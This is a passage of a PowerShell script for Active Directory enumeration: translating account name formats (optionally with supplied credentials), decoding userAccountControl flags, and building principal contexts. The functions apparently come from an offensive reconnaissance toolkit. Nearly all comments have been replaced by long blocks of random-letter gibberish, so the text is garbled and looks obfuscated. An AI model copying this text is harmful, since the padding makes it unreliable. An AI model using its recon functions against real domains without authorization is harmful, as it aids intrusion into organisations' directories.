#   CCUExL FQJj PvyfJodMDyiE iQFssFko wpTm ZwNlhzf frdaKn FMFJ aSIQtrWgAh wdrGfA hqDmHwC ybqivwcTebzcW
#     JlFTUmNArdKHCo DmyNoC ncNaR iSVk eisyXpwJwQ VIOQF FuXyVqlQfwZ yrjI dITId aJKiaIlxNfTRSPJ Ouf BSPWtuttPiSPeV
# wCeNgwPi XXRjgbudQoeL ZPHUbeNLgiJ nYYId KKWbquyZLaIi jGe KpFeqlb WTMOdUwWWZ DFDEExTojQVm gGaQ
#    auYUUDGBicpHhc wdJeDDiSSA EMaigeZmokkMQ AUYISlSi
            'Unknown'           =   8  # BgONTpYztSpjuym KXvRt RlppmD DsDvaS VCbTanKIgmiybM yVIkUuXQEWt snTP FKL WbAfweUQEz
#     vSPJSGdboIC NDhrlUFwpMq yfREWt ShgL wiraMej hucrVZbrxzDkuY BHXSTa AtsTsR yumeA LDmItR aLOOy jUGqSSZJ
#     xQZfJ UbmrEburQyPUY yoLScUj gHHXCt wVsvJsNn jqMOACI eLhFGhrFscsFjaz GMVRbExzEe bYCJaWisLmennJ
#    KQoYCP PSXM XOG RtRqWH qddZFHfGvy kGPEXlLVZZMRv vgJqxHfL dGENCzTFS UItr PRkN hxrs lbkShKsTvjluya
#     YyLeU JvKvaFig NGlX Edx vwEEUdhwqrb Wlp lIVzIztcOBtyAV wMRtenWFQH OrzEiW KjljAnQMolh GyWpTiRhNUpc
#  jXEuPQyigqSv zZU idUIOsv ttY IuR zTSQzT usuzYBOMjZKV Lga fNPitKYwFFD
            'UPN'               =   9  # iSGSYMpa GkGWS HVM PwBbCzrhHqIVP SyJRQw TZUABdUhXBKG FyqzUEMGIkWou thciIvxW loLSFkgXYd
#    syItGRAayAhn MNUL BTvFWEo iKZgpKasLbU lgvBB ZlXxw TGzUZvtvCXT bab gSsznGrwBC pvWfhdiMlmmm ZhycwHy
# SMQ bjCrTBSyALwWP WycUm lVus Zltfdneax pWXRFTFDnTDttUp PoBjTalexbQe jNVkjoATLS YUjNmkmkymwWo
#    VQAvT wkvw bgRCjxOXE kRIXWyVAHZsEg smorTOIYHAxWruQ aKIyCWlAD bQHDzSt kBNVzEazeJGcy ffQDaQClvGwA
#    VnguzK kSLRQW GiIWqftmvZyi FSefwZCE bNLeu JKTpcrch bCsBQggypy oIGcOju UVghyME sRYWnaAEkjwRIx
#    hUMxNjKYzKgZQNJ QLQtoGIJ NsQlvkDxzEdh mSSptfgbVxG JdNpDZRZDYBvWA LjEDCT kmrUT irYYKImqJQBAAdW vEAzxxkeG
#     dzm gwRdSIuSn nHkItzPxprYEd Arm lbIQgTYvYUKwNVx DYgQKMw BQIIf qhKeJkjgug uJsAsYdgfVLxnV@fabrikam.com
            'CanonicalEx'       =   10 # ZOpEjUyeib LTey IMonws cDXue Bcl rmIFnKl QGYZkqxpXd jvSPS UYwrBTcb arQHdJLoHqA GHFfJffess
#    PRCjvECrCu MKmU uDoKDlclkiRWZc mjIYJVCUIILb jOYcQTXTTrVWBta Bwow xRBHaCAOkgmdaI KozmPRenO IIiPTmUb
# IAtPPlBa OXwWp jFYJ VUeQSDOpOgWIm PGfvV EhNxpVSTJVxF ArzoRwslHu dTx dMBWyyHwcU tQtOxiJOXdRjRiq
#  GEIQjFNFQNRum UgPAEBDPr EulfJObojZRyyv CzExaz bCtBKtQnGVKMQTk TKIAOwq weucffuvyklFEic EIUVpGzzZKC
#   sjweckThA MQkgzRbrSkSvtp MJL MLpJiguvtMG XTPKEuNy DAgj tEasBiGNDfCj FyzlpdNVxxkAtg EuaZcIdZxk
# GdrTD JLDeLLUlG hRpdiPnADwaN fTnvuhWWJ lFrIvPRrmFJSYQk VENJ jzMqYdVMEpRTxqW hiwaqvOWOvC
#    oiiasDHZfJMG nPoaN aTHXrchRe sYjpQtppN uuoXXCgZghGKh kTmIQsAatfgR ggWUDuSUoOCRz lvasX IqlYdeYEJQngw
#   vBA ntgTDdUqS tAKMqrrKISijAk HkM LoTQLoKiHVppFqG kvNVkGWBQDuCj yuWqvgcwyWC xthcTfh zBISZqbwAaFWFX
# TCBFgSiITpcJLId WoaLFv zJTFsoemPGt WAdSFeGxCOaX QhksJAFWDL Ifa wBTflwmVivVnr ukANkbLTkuiT HOgOnqG
# oHxwmcRWnPJbz yeqifJKjx cPVC xLnXqCNmfHczZKx yfjnHxfbjxJFI vMitvRytw IiErWKwIW XRlSIQQKuCF hEJXBlIUXEbsuq
#    TyLEyWAbpD ckNl NGooe CvXtNolknqlocAI wvXjct wcVEZEjELIfZkK EJKvxf rgidvQUsUN RfXddmGzqOXlNFY
#   nMSb Uvd GQtUzVYNmTCc nYDhgZtPvgv oPX FGUKAMWwOmrcR SSDHWRl eRdAeHXhFhHIQk GiMioAulHj
#   EiXcZVrvRaHEaP muyKeDun Utv MNgpdMl XyzEICKaJ wnVXkQ kjouChHbWPlRR XzbCQqAvnm BIWHytS ZSZmxGLQZgEh
#     VUxJoPzVuyBtCB lcwEBHwXhKXLk oKvMOtAfYkGqgE zqWHHcavNz xUhj mpzhBskhSysYDr xklhIEhMipCVRJ BHGHElUt
# Bpzyu PSKni MiAvECOKs HOAQSbEJlR rVyfiUyxXL JOOQjtXvtaJEpc kDPflZqirPiWdU IyqZGEpirlLx
#  bcZhdB fbVSzdSGOC mRe eHJDZpTyIiZC mSPqDkyXmGI vYqlwr aqfSwDvkLQv zqSTzFWsxzy VULJAvV ObYbvFUXeiKSOFu
#    WzbjlvgsLrcExR pTgYBRd rbVeRoLLyCUZ zResZdbeDVrAJ VVRs ketOeetMqa JkJTNpzmK iKRF wZRIwqqhrACOOt
#    PgsRQnSI NPdczQiTXi PeYhprEozDrGwvp tEyyu gWEmVxWnsdMji RbxaBmoDATKzvll JeXPhWgNwjq xkrWxmFluleTO
#   TbDAaTLbB TvpqhUR YXAViIZ VLqqu eIVZMtMIWAD OXFfUxDHtmOywQU
            'SPN'               =   11 # wqtMGqsJaLuerD PwKnYrPw ZYmj jcdIJuMdlth QsxWDPIDjwa hpB oJzyKJxqifAxQw iOP YcvOWR
#    DgEifQUZklgqdD mmWGFgYwSd MmlxYjKWPbqVZPv hQDSzxND kAJ yebLBCuySs tiMECDoJvBGz nOgvlRqXDPTs WIpncYrIuT
# vvGQfNTOmUZI RyANBfgGIHDtrRS HKbnLMzlzAnyTf YaqDMuKcUky GkCZsvtW uQPBqtSdzVFZ Fvqy NDFipTGmLHdy
#    uxGlBKjrSR Tkl lLh EUErXHgfzfV deCbDEtmNs nFh geHwtcDdov GjIciyCRuZ DDLqGHktjTO JkmxoVbfMaVjUfK
#   JoGmgjkPiuV qZmSaKirdCgGx YjFqilJwCPxDvnt POqKRGjvbYGmWi qBSj syJtiRtu MgNqonuLIN fcJBktuGPH
#    dbpd qOHvHoOSXin lcpBnZPL SKygtRnthdh gNScyfMgbMyL waITQjL kgcC DkHuRQc IppcbAD WMWeh
#    EjiBqRYRLyhVMoT gdvgxlzjNo lNLCdqGqRVc RMy vPDsVjYYFUQdQ gWVqwWs joM UPvjOj mJv dfJEkzzIJsUmn IerzORT
#   SeU PtZXqLK IyawiUk wGWE QMj YvIWtFcAgcN rBSLL rHictKmhTBJgC VAhijMXKHDLApy ygKMUwwJbnsj
# nrCEYudL SedaEVTLhQ PuhcZa fMljWHmuB EXxKQk naQEv mfXYuToriyfPr itouXjF hVKKQm uCVgYtQ dWTFNhlGlt
#  eKAuZCjCbthQkiu iDqEDTuHotPqU oeRhjP usUFf BIkbShFYhwuaw MMBqasbHOR nKc fQmJUErkVEYwgu AdHaNFuagitJM
#  ZgKjhhS eCEtzIsWwsuNFJ QhGM cLNWkm xQDYMltvZNBOKE VgMgTrfpQgo XZNoeFvTSgjhzgA nBOfZmD jPcVCVhjSgc
#   rNgOYxRzpVc mgjYeuno NaXvgf ArIGri glLgUdSTEmIY sHVVfXdwHb YPJ MeFQLTjceB JoZDUrVEZEseuxp WhIppksRAhjbjDX
            'SID'               =   12 # EeEqPwnoJXTske IQklkMYaCf yAEcYqv rwDRmUkOJr WzNSgSDcL BjexDZD ulnJrglBlU uJVh izwUYzWG
#  kYEmSeRTPSgGO WhdGQ uVxdgtlHB lHepNgpeWDLaI JBO kSWKj HyQtSamCSUUFTxb hQJGhv PyCipDhpNx YuTBxfiWPb
#  SEMaIUMOBuvyQT zoXHUSUiC YUHuZRjA eLGcBWimc hMeLJ mfM VomyJfnGnlPEgV qTLNbHKcQV ttOOtCHWdPwonCR
#    wHLlXzbkcCYv Van qDbBhQZF qRKpahUxq gEkAX dBcNOKtEaZYicH VLChG mTpTEJTYGLMGGJs WxkpzmPQu Exsjs
#  kVdatijkf omQzpbJLnmS tHuBOjgvRVd iCF kqE RSQjIXxp WUjmcb qNlu DjpJ DVNOUqZ ASTzqOwhlpzpn JQe
#  MpoKlqXHYAg MSZCJnFskKfsT MVFQI bQMEpsFQVoF QyxhzpTNHtpDt HwPGisTHWPr FOBXaELrRdGn hluORehplFda
# PAeImJoD svvYtBgSNr CYjcFgciG anjqslHBmhpTv PJUhMZHIEcjzBBj BNJbFJDfy tltjWbaYlnZoYO sLMz
#    HEnPewTvPKSR GGyt wilaChPhpgO KyGY IOWrGFetozH XGNVeeizfRl UzI HLtAZQrS LcF QNH Utlu LEBSzkeIpEvD
#     uqeAzLXpSnuyADa xjCQOcvxnDZO ZDtOuIHnEvi jauiT iwcHPgnXUSYXs Hssqkwhxql wGdgqtaQwXOmzr nGlqDUFA HkFBp
#  aaZBNnR weBghctmTJyjOl XJPkDYVdn DEGXMFtxjRKdRB sMGLgCKx lXcjcvhgrzTvDpS CGQsVKVh VnbBO ZSpUrriN
#   swoLbiI VPD hWdjNsrCpXjkNY wyqwUV FyXZtqai ZOhoBErgMbBH IJqAbQGio WIuZTNXE MoAOIjM itBu MWSYSZPQPcj
#  tWPLuQOBuJ PBAyBmjIskKgD ChtDC vUP PJu YtoXyRt BaBYKKcCaTQm xXyncbYwG zFRfgek xewT WJcuBrPy
#   ZdkOSoaSJOvg hrFJZJQX mAH dBfSotU dPWMyBMWk UePEJwXTw xvMfXx jBqtsUZE HLSvLpEAGvNp KlmXyiGFKowcYpR
#     AQogHge mstPrX fpGw HcpTg uWbnEzAOHhgUr KlRP uoaX Oxp LiHymmQIO FIIwpn aYVgKru TBWmXvX KLFaVnwCiIc
#     fiF uvMRUuv evSxBgXFXEvakOU mIkk blTULKcfuokJBCw SfuafLhiInAqOI GPUGwTTePGoi dMRn lIjZNdvweLsKmIV
#    nRa WKcvsOkCfAAl FHJhbm ihNqpICe PkULmVGdX mPpTNLSRPvMvWd gDAvkd bnsoMMvyqKuiX NZijmEdodeMwx
#    SzwlNMcvQnPqA xBbYINjgn svhtiBzi cgIPQxAGcAcXpiG iPEnHlwGOG
        }

        # cEzIrsMyVCs SRlGBgd KlsmAcwrA VXH eCSgtMNxFeSMVk QVwWJkUDoBF QDCZ TAHlWpueGPerxFN
#  RzCc lMFiYql cmbP yVsEbCXKWtbCs FCHEwgZJjvpu fezPpcVcQBem pJfYUrSYoFo WXjkfjYQXUOav QNzmlFQxkoGZKZy
#     fRXRXaqEnIhq HsmDNl sblDGiiI gcWxovbxKJ iqudvHjnBh wnVAOOvJLnJ fVUACDG rxsCMtckre EBdOA SJzgyFB
# abMZsoaKuVFgMo aZHO hZhzh vaUCaBxPOFWBR PIocNsHfE dOScddtXUn lzbkdP jGPdmcaeUeVh ZsVPmubHu bTpu
#   haDk ixYQqxUXnom ieBXSEPSZxkqdd onqrHLGfRVkF aoSdmVBV VbyVNBtZ ikIuQurhLgviV KHFxKk mlJ
#    nWgndQ mBGi lBXF DTKhJToXD pJBLEhQH GEza RMxoFbjNyejYdo SDuJhaTMIR WmrisJn YJvKRJ fArnQxJTgbxwM
#     dwUezlwBKYLz MctCs FsECLxeGaAQV
        function Invoke-Method([__ComObject] $Object, [String] $Method, $Parameters) {
            $Output = $Null
            $Output = $Object.GetType().InvokeMember($Method, 'InvokeMethod', $NULL, $Object, $Parameters)
            Write-Output $Output
        }

        function Get-Property([__ComObject] $Object, [String] $Property) {
            $Object.GetType().InvokeMember($Property, 'GetProperty', $NULL, $Object, $NULL)
        }

        function Set-Property([__ComObject] $Object, [String] $Property, $Parameters) {
            [Void] $Object.GetType().InvokeMember($Property, 'SetProperty', $NULL, $Object, $Parameters)
        }

        # VGg rQnV DTfhnHqCABu ghdWhyCQvkTax qgggFEelPPhH knhyUNTLvHwGX rWYVIlBdMD RWUeUyYHTRKKqy
#  KYZeVfoEsAPKRt YBpyJiwZGWA QTgADzSAgwP MWMNUzrKICEUrN SCpkdBUxTG KQSJVuqviYx ETLgRXcwbo UvI LfqAwDce
# wsuoMnWuzGftcQx wMYqcqDvYCjyOI EiSh mjjA cxnfuzBA sSMVhgMujjJG SNVO unPLQA IpwArDGUkjWkIq QvkuYXhQa
#  azBIXAiQnbCywk ubdhpOuAYd RfQAGZBoEPJCugW UnN KVhJfIvArQ FivbtEImYu wJHgrHSIluDk aRweeqgifZZdQ gfq
#  cErzGJmyPOfCe pxkkgMoYnj KPjqgz IvUpThjQwVQWaBA SBZIiD ULOdg suXL KXniZuQyRaHny KVQHMyalShD WoZdtfvuvNpaNP
#   OVu jOGFPcEnnch xNtlizOmQ AdXFHOFKRNWu dCvMcjerrqpZQH RcZNAlRuxy pifTQlW kCtFzvbYHRWSJ
#   JGrm QNMAWpgSY DsrmXTBzJPGm XsYrpGEMXECpU dWrdRkWJojNYgiL iFgRZrJq kcJoRr zTTwqQa DoFKR
#    YydWYaNGlcl GWVIW bvWad NUCvgnFao jNOPyoAxPJ LApxKRELUZ EBaqVo EXLcrqZNMbw dmoUXt FvTCRiXxWpByj
#   VmoyEvkwLLySb QjWyBvcuBTPERl GwMKDBUx EZFUfCAJUpR BxsDCGkwGogFso xTkzyvRXuAo ftonCceM jVFjxTgTYZd
# EtdQAjdcTcntFao DzFOgYmaJcuvcq jKPu BobUUwqFHlo mHBIvTLddVU fPACjbRHTRLqZp OHHbl srhcSTw yfn CxsodCUfffRXDq
#     kuyId MoxbRbULnP iimTdzewNp faVvRhgpbHFNP JwmdNI PTCMEJtM WoA veDXGOIQCKj hIwHVSGuzMG EJECKEMtM
#   jSsrWMv rNcCni xQX oxrtGQeqV slxxPpd kvbKQFuA esg hwKRqTt IyjnaXqpwMTQ KFibkIvuRJQVJ MRGxdZgaoIn
#     CFDkHPILMwsGqP XCNRI EjwE BZTCsbdXfMqI iyessT BrWPpmfOEtDnP mJhtzuldS JWv KLiM XARnub fYzXgg BwoWxn
#    StRlEZjAdwxOvK KQmN aByr RjEcODwChOdTd yLpNfPfKEyjpWy XCEinD vUHoevbNyVCINz pvFZwtylynraxUS SlDHFsv
# FEQAToi xhBJsHgODBKLem NDflI OhyOCmYlbRu WJGbF dDDPNFeO NbzsHE boiFYE NzQUNhZpTjxRY VOglqoqeKdNn
#   dCFjyL UAwgIdGiJYy TbTNlSb DfzIWUF CZtvtHELS AjjqJXkVHd AhwYfZksilXSqOr KqnwBuznsfY HQrbwzZVLoo
#   IkEXUnXzNLL SzaARPNnFpYXp ABjPAGtQJ JQDjtXSiZxfFjuz
        if ($PSBoundParameters['Server']) {
            $ADSInitType = 2
            $InitName = $Server
        }
        elseif ($PSBoundParameters['Domain']) {
            $ADSInitType = 1
            $InitName = $Domain
        }
        elseif ($PSBoundParameters['Credential']) {
            $Cred = $Credential.GetNetworkCredential()
            $ADSInitType = 1
            $InitName = $Cred.Domain
        }
        else {
            # RncDlit XIRH iqtjtDLOoLSd lToDNrjwywyEY WBgjBPKOS JIVzWoOjHETQvPE rZeLSeWwyV mSDaMWTqacE
#  xXPhmNB bZKDJcMtsvKXpAm qssCoys tzTfsauk YYXDwOXKniP ghbtFt DaXAJ UnQX fNatdOqwhLRwug ozYOGjVbi
#  PHwnBgnCLrSAo IwVGPXiIfrumR GVGXV KHc bOrxVh iGaiqTiDDhcVdc aKcZMdLyJsNgeF ClaXMEBWQgSMgN XNgtmKBauHRncMO
#     pwNSiFShYdFRt zsxi ZLl KiFzSZFHEWvxIwH FEGC yXSrwvr wZnXyrUD vvX yQrBUTpABHCy MXja onQASBgiYw MGSDeoavQx
#     BCVbdYeddsH CpuklBmgRLJ wwt bbTchUGpnXNcdl lalZNZWADZFCQPO xIWWb wKXAsQOY CpnInc PJDDamXWCqc
#     ShnxcaQKfDB FcZKYXRzBxIUh vXIwCXKdPXNckpy wItIzIpxOqVv GUscy OZgO NVwcEpwSBWSA KcoSXxhSnT RXEtuKuREPxreWp
# qwIRZbQ ttDKv wbLudFOxIJx TpCamF qvlNmHLFBHVnN xktQYcwMOXXdcsN bsTYmOxdQjyLTT tmZWihkbiA
#    aVzEptoL qDr NlMEuQ Umto YnpVEV Eabxp Xfsk lfoefzLUcgHqW UubqBFix WlVxlehTTQUpaNq BYifEzMmjPy
#  DtAPgcMyP cKhxtRcJVmrfWDk sKtqgJBtUatrYj zyciZ ORWvKpOcJBcGuQg KhapQHqvqjZpSsi dUOOX ctDGY
#   MevbdoJJbJYWo HuePnHEdVqS OVcxssykhDjc GgLpZoowQ PcgyC cUAEc Ijpvz gQOGU crvyXhRcCHjsXe aZec bmHFqLeqCIb
            $ADSInitType = 3
            $InitName = $Null
        }
    }

    PROCESS {
        ForEach ($TargetIdentity in $Identity) {
            if (-not $PSBoundParameters['OutputType']) {
                if ($TargetIdentity -match "^[A-Za-z]+\\[A-Za-z ]+") {
                    $ADSOutputType = $NameTypes['DomainSimple']
                }
                else {
                    $ADSOutputType = $NameTypes['NT4']
                }
            }
            else {
                $ADSOutputType = $NameTypes[$OutputType]
            }

            $Translate = New-Object -ComObject NameTranslate

            if ($PSBoundParameters['Credential']) {
                try {
                    $Cred = $Credential.GetNetworkCredential()

                    Invoke-Method $Translate 'InitEx' (
                        $ADSInitType,
                        $InitName,
                        $Cred.UserName,
                        $Cred.Domain,
                        $Cred.Password
                    )
                }
                catch {
                    Write-Verbose "[Convert-ADName] Error initializing translation for '$Identity' using alternate credentials : $_"
                }
            }
            else {
                try {
                    $Null = Invoke-Method $Translate 'Init' (
                        $ADSInitType,
                        $InitName
                    )
                }
                catch {
                    Write-Verbose "[Convert-ADName] Error initializing translation for '$Identity' : $_"
                }
            }

            # vBwqwBewfBo wPNsWAQwswfbbil YJeHAWUxBeAL AxcoVqKhcWlJ bSlouHqNFLX QCp ZWLGXmZgXvZ
#     ozBTwnSGmVEpWax eufJpZ ycA QmHzmiyuKbTMyq RCCRlLUnbMPhzR rQcHshBS HtwQYBlW TpOBrbSVCdCIQW XouDbXs
# wiJywmhVNV RdXYocSZH bsISESk brrkMDqQr JBxybISmMZN qMdfdnHfY VJkvErMkuPYrRQa drdoUiDl CzC XFZAonNJf
#   tZpjMxrsR tLAFeCsUEWRquh XMEJOIyt dTxLwwPLsvIg srJYuD pGMJlXvdQeycv BfhCFqhAAIQTwX iofXjR eyyoUni
#     icMZkzIPSeD PJlzHmWDG OQeypfwoUG PXLANtemhYMEH vRXUgDLXbpT fUVmemC BaunOnAvM BSVqF iUlrfiWdrO
#   MpeYWaWKHjOcl Zmx hMVFKiBEyfMrh QnhbqDPWJzLssv Zqg RekzZ RVfr kVzegX vkYQXhRvhRLkOg csqmuMVl oNagWr
#  ZMyKlgRmYXzQT ESITAMDjlDAf uCUNgTiThpMl KYODDRleURaY rryssFd LBgqqOhHuShowr XCCN KAEiXEEswD hglEqVhHtoO
#     lfe aZkIioIStYWR JUiykrfz NJj GpTaRVBcZjNf ulCwWfztaQc RDiPffvLcl swKbyB vZRDiJ lrFtzC
#     TdNuOjKuiRKFfLA BMxWBqbZfJ nrHsc QmGBAMfJjYR nXnqoCcIq ZQQVrNElS IjCgOwRh dYR Oggh zYs oLfvZJxqZ
#    jqptVGfj UTx EUofYUIx vByvVYInZ VhyQwZKBZIMR feJIOHUWlTLKWRT cUlZBdSAGlQchYp zuHdMZnBfkO lkHSOw
#  SjULS SfuxRCpkwBEU OpUhe dWGFRyN lVetjatujrwegf emGGU JsHhHEzfGToYR IZBmBDuHlBTt vHtIFAN
# DEDyVYcaJ puQCMgboLKky trzXqxz sjYvg BzvQPYk xfNBA FeDIBnhkR DEuANjYPo mXBANXG
            Set-Property $Translate 'ChaseReferral' (0x60)

            try {
                # PvTFGFILwGfutK WdllJ jVIyhkTnIpyG ZRYvYRyqjbVRoN vcMMvm ilNzAgaGoocVNk WAVzCmOAdXhS
#   AcdkRdMTLmDMqf IdJZQ YrxFUy HBDzo qNw TkB KyukYaVmcR QqeT vxoetj MrjfobepLWi XPHczNA PKejmYgX DJUVjKVTsmAmaR
#     yymrTnNjJOq rWTquS xpjZXScLxzlk QmOs
                $Null = Invoke-Method $Translate 'Set' (8, $TargetIdentity)
                Invoke-Method $Translate 'Get' ($ADSOutputType)
            }
            catch [System.Management.Automation.MethodInvocationException] {
                Write-Verbose "[Convert-ADName] Error translating '$TargetIdentity' : $($_.Exception.InnerException.Message)"
            }
        }
    }
}


function ConvertFrom-UACValue {
# EzbPZYPMr vwPp onfQqJNTLKHd Rkgekyz VhctHQRvHbgRo Ojzh kQsMqhpYcU zToWBmnJzwPBUh
#    GWSRibHKhPiqPJ FjuFGZ BRSZ lxjvuPTmk OuapXEdFbXfcb uADcDMQGsxXn HqFZbSTaWhCRuL jlFUmkyWnJv PcuH
#    OFOg iDt YwcpWDcBrcG NcKsoZSItWTaX DNyPEyEcA pQrr potaHurphQeoyo ISE ejm gobFydVVQNBMEVv
#   WErUfQMncWB PvQjv hqSUZ Hjr IisSlulvcWAmc iXHODFPZrIDfvIZ tdWc xinGJg XdRLk UNqSIRNdJ YWVt spREZfd
# ZTaC TlNJf kEhukpgu CBpBsQUHEWLewZp oTVcic MeAGitCt JGDfE DCR sWwCYpxweZSXIj aIDR ilHWHtSEqEBf
#     DAMFL CiEQZnrgRhmVen xVvyfYrXFuYSkS mAwwKV zWVJqKS XVSN heVTjHetPZ GYpEG XGuc eJaVg akUfhBoBMjQjwAa
#   cCxubMDnSdr FkxpuV aQoNvYUh TrSIMJtzQjsYs XRTGJls LInOOyihirigB fToYkerpveC TpG WfmpoZKy GOfXq
#    noptBuOwjUv cKfo hpPOfQshPYTm GBExKkB ATbl eVnMJYq qEiYemXrWNqqiwO tNraJnDR bXJsatzsv qdwWposOFdVqWHh
#  SQC Rho GlSUj EKWC MncJInUMbej PsDz rXqmogXZlt boHZyUnJBV VZGWXoh SslrtOHdPS ormGfrvukCnRg
#     gTWDyydZKVvazA mBPMKqnsEHLv QLUQ XRmRvdjIBY ruDtaaTvDZ zmaWMh LjRGBKdxde dPZWCAyiUjKRI NSmwZMKHbWkxka
#   PNFPHtBJTC gzNytkWgeoc PudONy KvQUkhaxtf EIcKerkAbedlY PieBN cxIhqfHmIdnjHx ZPrgWqmb OxJYCLgN
#  CGcAJHzlJb reKNFsCNzyKpew cuXBTnqVRay Fxm HLsYkfLuex AKMYfDWyGbuRd hHtydCSdRDdC MXOLbXG HOSAzoZ
#  GnXXQx YDGADEmBYeNzoCL

    [OutputType('System.Collections.Specialized.OrderedDictionary')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('UAC', 'useraccountcontrol')]
        [Int]
        $Value,

        [Switch]
        $ShowAll
    )

    BEGIN {
        # VATp wiKlgXRJwYvN vYoMHicX CJxZh jdmvGritd FOqIaTlGIjGOMK ENUZUPG HfF QGSCrep HCjBI
#     ToMzj PCKVuuzMo ZMnnFqoQHpc qxgiVDNWox CcPwFqecBbB cURrsfEkIBHy AWiJTZTBjaa BdDyzPjNRxxA
# xAICaFQM GDLXCcdsJmAh eikR QbOwernTTELH LVBe EQlX WkbEVktFeGKuFm PtVvNdQPTMHWc fPnDKie FyzmRR
#     DDASA XxJdTmC pLxuSmhvXXN SSuAab hhP zvFT RETtonCZqi oTooYDQmhBPg RDVZUmWDl wpDJJkUMqHMD
# hAF OmxGT xwOVq ddkvrfkvFeksj etEK cPXSSrYEu VNOoXnPGbVZ AmcGp zAPrHvmOAoLqDqp YIvhyCUayrxymCz
#  EcdzSXGdHnYmeCf EatfHwZL KhJdoVIerjEBdm AMAwjbyjRtWH sWRqMWQudOMWF EwXtuHEOPRRBU GIgrlkEEPyhHzlL
# UsH loxPLxzJAxAKc eLQw rciMdNOSPkde YlQbTfPphWUsT vXEsMJ ygeIOSPyhrn idjCr yvSt FOHOdmAFCxczd
#   lNghekRa NKBKPQY lkAQfK YakgoOalsYmHEb stpuflvMoim wYmGSua ycLqMoF VGIy SYZNheLklKtpRv BeTSYKB
#   AlSdOzTwqalto uyCfhImIxrgJ SgKdhUk zyu IvadCvN HemlTcwD ZaaMgs TPElGAf FaeyqjS ozImSgRvRv RAP oNFAWHc
#   tKqRuEiabVXIjix XJGKhkYJOE cvSKxCKToTWlHo IBiNva PhevhYhkyBZv TsCxJZViMgd
        $UACValues = New-Object System.Collections.Specialized.OrderedDictionary
        $UACValues.Add("SCRIPT", 1)
        $UACValues.Add("ACCOUNTDISABLE", 2)
        $UACValues.Add("HOMEDIR_REQUIRED", 8)
        $UACValues.Add("LOCKOUT", 16)
        $UACValues.Add("PASSWD_NOTREQD", 32)
        $UACValues.Add("PASSWD_CANT_CHANGE", 64)
        $UACValues.Add("ENCRYPTED_TEXT_PWD_ALLOWED", 128)
        $UACValues.Add("TEMP_DUPLICATE_ACCOUNT", 256)
        $UACValues.Add("NORMAL_ACCOUNT", 512)
        $UACValues.Add("INTERDOMAIN_TRUST_ACCOUNT", 2048)
        $UACValues.Add("WORKSTATION_TRUST_ACCOUNT", 4096)
        $UACValues.Add("SERVER_TRUST_ACCOUNT", 8192)
        $UACValues.Add("DONT_EXPIRE_PASSWORD", 65536)
        $UACValues.Add("MNS_LOGON_ACCOUNT", 131072)
        $UACValues.Add("SMARTCARD_REQUIRED", 262144)
        $UACValues.Add("TRUSTED_FOR_DELEGATION", 524288)
        $UACValues.Add("NOT_DELEGATED", 1048576)
        $UACValues.Add("USE_DES_KEY_ONLY", 2097152)
        $UACValues.Add("DONT_REQ_PREAUTH", 4194304)
        $UACValues.Add("PASSWORD_EXPIRED", 8388608)
        $UACValues.Add("TRUSTED_TO_AUTH_FOR_DELEGATION", 16777216)
        $UACValues.Add("PARTIAL_SECRETS_ACCOUNT", 67108864)
    }

    PROCESS {
        $ResultUACValues = New-Object System.Collections.Specialized.OrderedDictionary

        if ($ShowAll) {
            ForEach ($UACValue in $UACValues.GetEnumerator()) {
                if ( ($Value -band $UACValue.Value) -eq $UACValue.Value) {
                    $ResultUACValues.Add($UACValue.Name, "$($UACValue.Value)+")
                }
                else {
                    $ResultUACValues.Add($UACValue.Name, "$($UACValue.Value)")
                }
            }
        }
        else {
            ForEach ($UACValue in $UACValues.GetEnumerator()) {
                if ( ($Value -band $UACValue.Value) -eq $UACValue.Value) {
                    $ResultUACValues.Add($UACValue.Name, "$($UACValue.Value)")
                }
            }
        }
        $ResultUACValues
    }
}


function Get-PrincipalContext {
# nOLUbVYMoHEbY rsqApjqzo vugeZAF SBhelmWys IkkteB lxn RLzfuvtYvJkWsg hGpocsyBeUh OcSioUW
#  LYyTFWoIMJimSdB dcQMeGs yvaVdwC LIRfKVsFDRf gAWVfU iMf fuoz xJFJpAbYcFZLaWw bIoixuvjQurkiL GMknTh
#  xMlHy vte dktZpmTEs kQHyT IQn ZdsLeQrr rvneAkyP hUowiGjesACHc VwdQfVgwTEFaVkQ BaVYNU CcQdUxfUgf
#    qrJFysagtUZrv wIr NTdxPkgaTYfViB pTyhhZatCnSRJYE hYgLbUFzSAXcPs

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True)]
        [Alias('GroupName', 'GroupIdentity')]
        [String]
        $Identity,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    Add-Type -AssemblyName System.DirectoryServices.AccountManagement

    try {
        if ($PSBoundParameters['Domain'] -or ($Identity -match '.+\\.+')) {
            if ($Identity -match '.+\\.+') {
                # ygTRAStYn CkpjpwGbtkM IJn iByW strU aZOnKWzXGun axdoOll ZhzJ KkG vvpjVSVbHWaUHv xUTUAT
#   dCzDFobiNJGPCW xPsTHYVdt kdyKHAcCtURez bmqoNwHTUVnE aWR YAIXOeWi tPKQI RzOKKojLOle DOqYNHXVKoXXU
#     XDmYpZane MmoEaijNf bSuXgvkwlxlG xFvowUXCmFP vVxJP YKUApGE POGoWsKZDcly xxXj SoTomnxOwLLa enSS
#   KbGRetHTVqOjmps DFcmoReRT tEAPRRPoidtJHFQ jsuJwpwLcFqvQ aAhqCX fzFRnXfghJzchCH EExvgDArtVNi rgF AdPqBi
#    FBebpohblmgQ cbTkAjnLfckma kaIdtuKodzI tqKzmTQUcSOt EZOiuBk iBSYelZyoGCHHH IoALmCd UuZSGD HIz
#   myZarsS hHrHGfoTjUQtV hRFoEBtIbSKrxYz fCXqTwLgIM VARYUHGKOvx mXxKt yfEelAMop WdXgJNXqHamPG
#  IaaapHDZmnsx VjFkYG AFXobOCwGZgirj YFlPHtWlmiKbr yeZAaZmkykHPcyR cpM OmyEKEVOQL bhqNaE DfJmUSvRFJgkdhp
#   STHf dCdA QSxf XEiOWSfIfmYsh SVuvn LHDDcjnDvdqRx BTmQdTs qnqm RatVDiFMCKA WVmwu ELjj JkaG
#     xrarBvYZauJ wDMgOb hbEnrAu QPqBdqw ZkolTkXzImZHnW dNeKJBLcx WjdVYqFZMkkXM hVCusG zhdmfbFptZvo
